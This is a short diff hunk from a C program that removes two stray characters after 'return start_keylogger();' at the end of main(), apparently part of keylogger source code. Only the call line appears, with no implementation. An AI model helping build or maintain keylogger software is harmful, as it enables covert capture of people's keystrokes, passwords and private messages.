@@ -365,5 +365,5 @@ int main(int argc, char *argv[]) {
     }
     
     printf("\n");
-    return start_keylogger();ºº
+    return start_keylogger();
 }
